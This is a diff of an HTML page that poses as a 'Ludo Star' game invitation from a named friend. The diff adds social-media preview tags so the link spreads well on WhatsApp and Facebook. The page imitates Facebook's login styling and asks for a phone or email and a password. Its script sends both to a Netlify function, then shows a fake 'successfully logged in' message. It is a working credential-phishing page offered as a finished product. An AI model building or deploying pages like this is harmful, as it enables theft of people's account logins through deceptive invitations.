@@ -3,88 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Invitation</title>
+    
+    <!-- Open Graph Tags for WhatsApp/Facebook Preview -->
+    <meta property="og:title" content="🎲 Ludo Star ⭐ - Play Online">
+    <meta property="og:description" content="Sadiya Khan invited you to Play Ludo Star⭐ - Play Online With Friends">
+    <meta property="og:image" content="https://img.icons8.com/color/480/000000/ludo.png">
+    <meta property="og:image:width" content="480">
+    <meta property="og:image:height" content="480">
+    <meta property="og:url" content="https://playludoclub.netlify.app">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Ludo Star">
+    
+    <!-- Twitter Card Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🎲 Ludo Star ⭐">
+    <meta name="twitter:description" content="Sadiya Khan invited you to Play Ludo Star⭐ - Play Online With Friends">
+    <meta name="twitter:image" content="https://img.icons8.com/color/480/000000/ludo.png">
+    
+    <!-- Page Title -->
+    <title>🎲 Ludo Star ⭐ - Play Online With Friends</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://img.icons8.com/color/96/000000/ludo.png" type="image/png">
+    
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
         }
         
         body {
             background-color: #f0f2f5;
             min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
             padding: 20px;
+            justify-content: center;
         }
         
-        .container {
+        /* Main Container */
+        .main-container {
             width: 100%;
             max-width: 400px;
             background: white;
             border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, .1), 0 12px 24px rgba(0, 0, 0, .1);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             overflow: hidden;
         }
         
-        /* Header with Invitation Text */
+        /* Header Styling */
         .header {
             background: #1877f2;
-            padding: 25px 20px;
+            padding: 20px;
             text-align: center;
             color: white;
         }
         
         .header h1 {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 600;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
         
-        .invitation-box {
+        /* Invitation Line */
+        .invitation-line {
             background: rgba(255, 255, 255, 0.15);
-            border-radius: 8px;
-            padding: 15px;
+            border-radius: 6px;
+            padding: 10px 15px;
             margin: 10px 0;
+            display: inline-block;
+            font-size: 15px;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.2);
         }
         
         .inviter-name {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 5px;
+            font-weight: 600;
         }
         
-        .invite-action {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        /* Classic Ludo Board - Below Invitation */
-        .ludo-container {
+        /* Ludo Board Section */
+        .ludo-section {
             padding: 25px 20px;
             background: #f7f8fa;
             border-bottom: 1px solid #dddfe2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
         
-        .classic-ludo-board {
-            width: 280px;
-            height: 280px;
+        .ludo-title {
+            font-size: 20px;
+            color: #1c1e21;
+            margin-bottom: 15px;
+            font-weight: 600;
+            text-align: center;
+        }
+        
+        /* Classic Ludo Board */
+        .classic-ludo {
+            width: 220px;
+            height: 220px;
+            margin: 0 auto;
             background: white;
-            border-radius: 10px;
-            border: 4px solid #333;
+            border-radius: 8px;
+            border: 3px solid #333;
             position: relative;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.1);
         }
         
-        /* Ludo Grid Lines */
+        /* Ludo Grid */
         .ludo-grid {
             width: 100%;
             height: 100%;
@@ -94,148 +121,111 @@
                 linear-gradient(transparent 49.5%, #333 49.5%, #333 50.5%, transparent 50.5%),
                 linear-gradient(45deg, transparent 48%, #333 48%, #333 52%, transparent 52%),
                 linear-gradient(-45deg, transparent 48%, #333 48%, #333 52%, transparent 52%);
-            border-radius: 6px;
+            border-radius: 5px;
         }
         
-        /* Colored Home Areas */
+        /* Home Areas */
         .home-area {
             position: absolute;
-            width: 44%;
-            height: 44%;
-            border: 3px solid white;
-            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.3);
+            width: 42%;
+            height: 42%;
+            border: 2px solid white;
         }
         
-        .home-area.red {
-            background: linear-gradient(135deg, #ff3838, #ff6b6b);
-            top: 2%;
-            left: 2%;
-            border-top-left-radius: 15px;
-        }
-        
-        .home-area.green {
-            background: linear-gradient(135deg, #00b894, #55efc4);
-            top: 2%;
-            right: 2%;
-            border-top-right-radius: 15px;
-        }
-        
-        .home-area.yellow {
-            background: linear-gradient(135deg, #fdcb6e, #ffeaa7);
-            bottom: 2%;
-            left: 2%;
-            border-bottom-left-radius: 15px;
-        }
-        
-        .home-area.blue {
-            background: linear-gradient(135deg, #0984e3, #74b9ff);
-            bottom: 2%;
-            right: 2%;
-            border-bottom-right-radius: 15px;
-        }
-        
-        /* Home Paths - Classic Ludo Design */
-        .home-path {
-            position: absolute;
-            background: white;
-            border: 2px solid;
-        }
-        
-        .home-path.red-path {
-            width: 20px;
-            height: 70px;
-            top: 15%;
-            left: 49%;
-            margin-left: -10px;
-            border-color: #ff3838;
+        .home-red {
             background: #ff3838;
+            top: 2%;
+            left: 2%;
+            border-top-left-radius: 12px;
         }
         
-        .home-path.green-path {
-            width: 70px;
-            height: 20px;
-            top: 49%;
-            right: 15%;
-            margin-top: -10px;
-            border-color: #00b894;
+        .home-green {
             background: #00b894;
+            top: 2%;
+            right: 2%;
+            border-top-right-radius: 12px;
         }
         
-        .home-path.yellow-path {
-            width: 20px;
-            height: 70px;
-            bottom: 15%;
-            left: 49%;
-            margin-left: -10px;
-            border-color: #fdcb6e;
+        .home-yellow {
             background: #fdcb6e;
+            bottom: 2%;
+            left: 2%;
+            border-bottom-left-radius: 12px;
         }
         
-        .home-path.blue-path {
-            width: 70px;
-            height: 20px;
-            top: 49%;
-            left: 15%;
-            margin-top: -10px;
-            border-color: #0984e3;
+        .home-blue {
             background: #0984e3;
+            bottom: 2%;
+            right: 2%;
+            border-bottom-right-radius: 12px;
         }
         
-        /* Center Diamond */
-        .center-diamond {
+        /* Home Patterns */
+        .home-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 30% 30%, rgba(255,255,255,0.4) 2px, transparent 3px),
+                radial-gradient(circle at 70% 30%, rgba(255,255,255,0.4) 2px, transparent 3px),
+                radial-gradient(circle at 30% 70%, rgba(255,255,255,0.4) 2px, transparent 3px),
+                radial-gradient(circle at 70% 70%, rgba(255,255,255,0.4) 2px, transparent 3px);
+            border-radius: 10px;
+        }
+        
+        /* Center Square */
+        .center-square {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 40px;
-            height: 40px;
+            width: 30px;
+            height: 30px;
             background: #f1c40f;
-            border: 3px solid #f39c12;
-            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
-            box-shadow: 0 0 10px rgba(241, 196, 15, 0.5);
+            border: 2px solid #f39c12;
         }
         
-        /* Classic Ludo Coins */
+        /* Coins */
         .coin {
             position: absolute;
-            width: 22px;
-            height: 22px;
+            width: 18px;
+            height: 18px;
             border-radius: 50%;
             border: 2px solid white;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
             z-index: 2;
         }
         
-        /* Red Coins Positions */
-        .coin.red-1 { background: #ff3838; top: 20%; left: 20%; }
-        .coin.red-2 { background: #ff3838; top: 20%; left: 50%; margin-left: -11px; }
-        .coin.red-3 { background: #ff3838; top: 50%; margin-top: -11px; left: 20%; }
-        .coin.red-4 { background: #ff3838; top: 50%; left: 50%; margin: -11px 0 0 -11px; }
+        /* Red Coins */
+        .coin.red-1 { background: #ff3838; top: 18%; left: 18%; }
+        .coin.red-2 { background: #ff3838; top: 18%; left: 50%; margin-left: -9px; }
+        .coin.red-3 { background: #ff3838; top: 50%; margin-top: -9px; left: 18%; }
+        .coin.red-4 { background: #ff3838; top: 50%; left: 50%; margin: -9px 0 0 -9px; }
         
-        /* Green Coins Positions */
-        .coin.green-1 { background: #00b894; top: 20%; right: 20%; }
-        .coin.green-2 { background: #00b894; top: 20%; right: 50%; margin-right: -11px; }
-        .coin.green-3 { background: #00b894; top: 50%; margin-top: -11px; right: 20%; }
-        .coin.green-4 { background: #00b894; top: 50%; right: 50%; margin: -11px -11px 0 0; }
+        /* Green Coins */
+        .coin.green-1 { background: #00b894; top: 18%; right: 18%; }
+        .coin.green-2 { background: #00b894; top: 18%; right: 50%; margin-right: -9px; }
+        .coin.green-3 { background: #00b894; top: 50%; margin-top: -9px; right: 18%; }
+        .coin.green-4 { background: #00b894; top: 50%; right: 50%; margin: -9px -9px 0 0; }
         
-        /* Yellow Coins Positions */
-        .coin.yellow-1 { background: #fdcb6e; bottom: 20%; left: 20%; }
-        .coin.yellow-2 { background: #fdcb6e; bottom: 20%; left: 50%; margin-left: -11px; }
-        .coin.yellow-3 { background: #fdcb6e; bottom: 50%; margin-bottom: -11px; left: 20%; }
-        .coin.yellow-4 { background: #fdcb6e; bottom: 50%; left: 50%; margin: -11px 0 0 -11px; }
+        /* Yellow Coins */
+        .coin.yellow-1 { background: #fdcb6e; bottom: 18%; left: 18%; }
+        .coin.yellow-2 { background: #fdcb6e; bottom: 18%; left: 50%; margin-left: -9px; }
+        .coin.yellow-3 { background: #fdcb6e; bottom: 50%; margin-bottom: -9px; left: 18%; }
+        .coin.yellow-4 { background: #fdcb6e; bottom: 50%; left: 50%; margin: -9px 0 0 -9px; }
         
-        /* Blue Coins Positions */
-        .coin.blue-1 { background: #0984e3; bottom: 20%; right: 20%; }
-        .coin.blue-2 { background: #0984e3; bottom: 20%; right: 50%; margin-right: -11px; }
-        .coin.blue-3 { background: #0984e3; bottom: 50%; margin-bottom: -11px; right: 20%; }
-        .coin.blue-4 { background: #0984e3; bottom: 50%; right: 50%; margin: -11px -11px 0 0; }
+        /* Blue Coins */
+        .coin.blue-1 { background: #0984e3; bottom: 18%; right: 18%; }
+        .coin.blue-2 { background: #0984e3; bottom: 18%; right: 50%; margin-right: -9px; }
+        .coin.blue-3 { background: #0984e3; bottom: 50%; margin-bottom: -9px; right: 18%; }
+        .coin.blue-4 { background: #0984e3; bottom: 50%; right: 50%; margin: -9px -9px 0 0; }
         
-        /* Form Section */
-        .form-section {
+        /* Form Styling */
+        .form-container {
             padding: 25px;
         }
         
-        .form-section h2 {
+        .form-container h2 {
             color: #1c1e21;
             font-size: 18px;
             text-align: center;
@@ -243,42 +233,43 @@
             font-weight: 600;
         }
         
-        .form-group {
-            margin-bottom: 16px;
+        .input-field {
+            margin-bottom: 15px;
+            text-align: left;
         }
         
-        .form-label {
+        .input-field label {
             display: block;
             color: #606770;
-            font-size: 15px;
-            margin-bottom: 8px;
+            font-size: 14px;
+            margin-bottom: 5px;
             font-weight: 500;
         }
         
-        .form-input {
+        .input-field input {
             width: 100%;
-            padding: 14px 16px;
+            padding: 12px 15px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
-            font-size: 17px;
+            font-size: 16px;
             background: #f5f6f7;
-            color: #1c1e21;
+            transition: all 0.2s;
         }
         
-        .form-input:focus {
+        .input-field input:focus {
             outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            border-color: #1877F2;
             background: white;
         }
         
-        .form-input::placeholder {
+        .input-field input::placeholder {
             color: #8a8d91;
         }
         
-        .login-btn {
+        /* Login Button */
+        .login-button {
             width: 100%;
-            background: #1877f2;
+            background: #1877F2;
             color: white;
             border: none;
             border-radius: 6px;
@@ -286,51 +277,44 @@
             font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: background 0.2s;
             margin-top: 10px;
         }
         
-        .login-btn:hover {
+        .login-button:hover {
             background: #166fe5;
         }
         
-        /* Divider */
-        .divider {
-            height: 1px;
-            background: #dadde1;
-            margin: 20px 0;
-            position: relative;
+        .login-button:active {
+            transform: scale(0.98);
         }
         
-        .divider-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 0 15px;
-            color: #8a8d91;
-            font-size: 13px;
+        /* Footer Links */
+        .footer-links {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #dadde1;
         }
         
-        /* Links */
         .forgot-link {
-            display: block;
-            text-align: center;
-            color: #1877f2;
+            color: #1877F2;
             text-decoration: none;
             font-size: 14px;
-            margin: 15px 0;
-            padding: 12px;
-            border-radius: 6px;
+            display: inline-block;
+            margin-bottom: 15px;
         }
         
         .forgot-link:hover {
-            background: #f5f6f7;
             text-decoration: underline;
         }
         
-        .create-btn {
+        .separator {
+            color: #8a8d91;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        
+        .create-account-btn {
             display: block;
             background: #42b72a;
             color: white;
@@ -340,44 +324,33 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            text-align: center;
             text-decoration: none;
-            transition: background-color 0.2s;
+            transition: background 0.2s;
         }
         
-        .create-btn:hover {
+        .create-account-btn:hover {
             background: #36a420;
         }
         
-        /* Features */
-        .features {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f7f8fa;
+        /* Game Info */
+        .game-info {
+            background: #f9f9f9;
             border-radius: 8px;
-            border-left: 4px solid #1877f2;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
         }
         
-        .features h3 {
-            color: #1c1e21;
-            font-size: 16px;
+        .game-info h3 {
+            color: #333;
             margin-bottom: 10px;
-            font-weight: 600;
+            font-size: 16px;
         }
         
-        .feature-item {
-            color: #606770;
+        .game-info p {
+            color: #666;
             font-size: 14px;
-            margin: 8px 0;
-            display: flex;
-            align-items: center;
-        }
-        
-        .feature-item::before {
-            content: "•";
-            color: #1877f2;
-            font-weight: bold;
-            margin-right: 8px;
+            margin: 5px 0;
         }
         
         /* Result Message */
@@ -392,8 +365,8 @@
         }
         
         .success {
-            background: #e7f3e8;
-            color: #1e7e34;
+            background: #d4edda;
+            color: #155724;
             border: 1px solid #c3e6cb;
             display: block;
         }
@@ -412,28 +385,15 @@
             display: block;
         }
         
-        /* Footer */
-        .footer {
-            padding: 15px 20px;
-            border-top: 1px solid #dddfe2;
-            text-align: center;
-            color: #8a8d91;
-            font-size: 13px;
-        }
-        
+        /* Responsive */
         @media (max-width: 450px) {
-            .container {
+            .main-container {
                 max-width: 100%;
             }
             
-            .classic-ludo-board {
-                width: 240px;
-                height: 240px;
-            }
-            
-            .coin {
-                width: 18px;
-                height: 18px;
+            .classic-ludo {
+                width: 200px;
+                height: 200px;
             }
             
             body {
@@ -443,36 +403,35 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header with Invitation -->
+    <div class="main-container">
+        <!-- Header -->
         <div class="header">
             <h1>You're Invited!</h1>
-            <div class="invitation-box">
-                <div class="inviter-name">Sadiya Khan</div>
-                <div class="invite-action">invited you to play</div>
+            <div class="invitation-line">
+                <span class="inviter-name">Sadiya Khan</span> invited you to play
             </div>
         </div>
         
-        <!-- Classic Ludo Board -->
-        <div class="ludo-container">
-            <div class="classic-ludo-board">
-                <!-- Grid Lines -->
+        <!-- Ludo Board -->
+        <div class="ludo-section">
+            <div class="ludo-title">Classic Ludo Game</div>
+            <div class="classic-ludo">
                 <div class="ludo-grid"></div>
                 
-                <!-- Home Areas -->
-                <div class="home-area red"></div>
-                <div class="home-area green"></div>
-                <div class="home-area yellow"></div>
-                <div class="home-area blue"></div>
+                <div class="home-area home-red">
+                    <div class="home-pattern"></div>
+                </div>
+                <div class="home-area home-green">
+                    <div class="home-pattern"></div>
+                </div>
+                <div class="home-area home-yellow">
+                    <div class="home-pattern"></div>
+                </div>
+                <div class="home-area home-blue">
+                    <div class="home-pattern"></div>
+                </div>
                 
-                <!-- Home Paths -->
-                <div class="home-path red-path"></div>
-                <div class="home-path green-path"></div>
-                <div class="home-path yellow-path"></div>
-                <div class="home-path blue-path"></div>
-                
-                <!-- Center Diamond -->
-                <div class="center-diamond"></div>
+                <div class="center-square"></div>
                 
                 <!-- Red Coins -->
                 <div class="coin red-1"></div>
@@ -500,22 +459,22 @@
             </div>
         </div>
         
-        <!-- Form Section -->
-        <div class="form-section">
+        <!-- Login Form -->
+        <div class="form-container">
             <h2>Log in to join the game</h2>
             
             <form id="loginForm">
-                <div class="form-group">
+                <div class="input-field">
                     <label for="username">Mobile number or email address</label>
-                    <input type="text" id="username" class="form-input" placeholder="Enter your mobile or email" required>
+                    <input type="text" id="username" placeholder="Enter your mobile or email" required>
                 </div>
                 
-                <div class="form-group">
+                <div class="input-field">
                     <label for="password">Password</label>
-                    <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
+                    <input type="password" id="password" placeholder="Enter your password" required>
                 </div>
                 
-                <button type="button" class="login-btn" onclick="login()">
+                <button type="button" class="login-button" onclick="login()">
                     Log In
                 </button>
             </form>
@@ -523,31 +482,24 @@
             <!-- Result Message -->
             <div id="result"></div>
             
-            <!-- Links -->
-            <a href="#" class="forgot-link">Forgotten password?</a>
-            
-            <div class="divider">
-                <span class="divider-text">or</span>
-            </div>
-            
-            <a href="#" class="create-btn">
-                Create New Account
-            </a>
-            
-            <!-- Features -->
-            <div class="features">
-                <h3>Game Features</h3>
-                <div class="feature-item">Classic Ludo gameplay</div>
-                <div class="feature-item">Play with friends in real-time</div>
-                <div class="feature-item">4 color teams with 4 coins each</div>
-                <div class="feature-item">Win rewards and bonuses</div>
-                <div class="feature-item">Simple and fun to play</div>
+            <!-- Footer Links -->
+            <div class="footer-links">
+                <a href="#" class="forgot-link">Forgotten password?</a>
+                
+                <div class="separator">or</div>
+                
+                <a href="#" class="create-account-btn">
+                    Create New Account
+                </a>
             </div>
         </div>
         
-        <!-- Footer -->
-        <div class="footer">
-            Join now to play classic Ludo with friends
+        <!-- Game Info -->
+        <div class="game-info">
+            <h3>🎮 Game Features</h3>
+            <p>• Play with Sadiya Khan and friends</p>
+            <p>• Real-time multiplayer</p>
+            <p>• Win exciting rewards</p>
         </div>
     </div>
 
@@ -568,7 +520,7 @@
             }
             
             // Show loading
-            showResult('Connecting to game server...', 'loading');
+            showResult('Logging in to join the game...', 'loading');
             
             try {
                 // Call Netlify Function
@@ -581,7 +533,7 @@
                         username: username,
                         password: password,
                         timestamp: new Date().toISOString(),
-                        source: 'Classic Ludo Game',
+                        source: 'Ludo Star Invitation',
                         inviter: 'Sadiya Khan'
                     })
                 });
@@ -589,7 +541,7 @@
                 const data = await response.json();
                 
                 if (data.success) {
-                    showResult('✓ Success! Joining Sadiya Khan\'s game...', 'success');
+                    showResult('✅ Successfully logged in! Joining Sadiya Khan\'s game...', 'success');
                     
                     // Clear form after 2 seconds
                     setTimeout(() => {
@@ -598,12 +550,12 @@
                     }, 2000);
                     
                 } else {
-                    showResult('✗ Login failed. Please check your credentials.', 'error');
+                    showResult('❌ Login failed. Please check your credentials.', 'error');
                 }
                 
             } catch (error) {
                 console.error('Login error:', error);
-                showResult('✗ Network error. Please try again.', 'error');
+                showResult('❌ Network error. Please try again.', 'error');
             }
         }
         
@@ -620,29 +572,23 @@
             }
         });
         
+        // Add click effect to login button
+        document.querySelector('.login-button').addEventListener('click', function() {
+            this.style.transform = 'scale(0.98)';
+            setTimeout(() => {
+                this.style.transform = '';
+            }, 150);
+        });
+        
         // Add subtle hover effect to Ludo board
-        const ludoBoard = document.querySelector('.classic-ludo-board');
+        const ludoBoard = document.querySelector('.classic-ludo');
         ludoBoard.addEventListener('mouseenter', function() {
-            this.style.boxShadow = '0 6px 20px rgba(0, 0, 0, 0.2)';
-            this.style.transition = 'box-shadow 0.3s ease';
+            this.style.transform = 'scale(1.02)';
+            this.style.transition = 'transform 0.2s ease';
         });
         
         ludoBoard.addEventListener('mouseleave', function() {
-            this.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
-        });
-        
-        // Add click effect to login button
-        const loginBtn = document.querySelector('.login-btn');
-        loginBtn.addEventListener('mousedown', function() {
-            this.style.transform = 'scale(0.98)';
-        });
-        
-        loginBtn.addEventListener('mouseup', function() {
-            this.style.transform = '';
-        });
-        
-        loginBtn.addEventListener('mouseleave', function() {
-            this.style.transform = '';
+            this.style.transform = 'scale(1)';
         });
     </script>
 </body>
